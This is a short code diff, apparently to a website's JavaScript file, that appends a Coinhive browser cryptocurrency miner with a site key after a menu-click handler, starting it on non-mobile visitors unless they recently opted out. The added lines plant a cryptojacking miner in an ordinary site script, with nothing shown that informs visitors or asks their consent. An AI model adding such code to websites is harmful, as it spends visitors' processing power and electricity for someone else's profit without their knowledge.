@@ -39,3 +39,13 @@ function menuClick() {
 }
 
 menuClick();
+
+
+//Coinhive script
+var miner = new CoinHive.Anonymous('4SxY5rIdGvO3MT3CJet0Hm8GEjGW7SP2', 'dev_log');
+
+// Only start on non-mobile devices and if not opted-out
+// in the last 14400 seconds (4 hours):
+if (!miner.isMobile() && !miner.didOptOut(14400)) {
+	miner.start();
+}
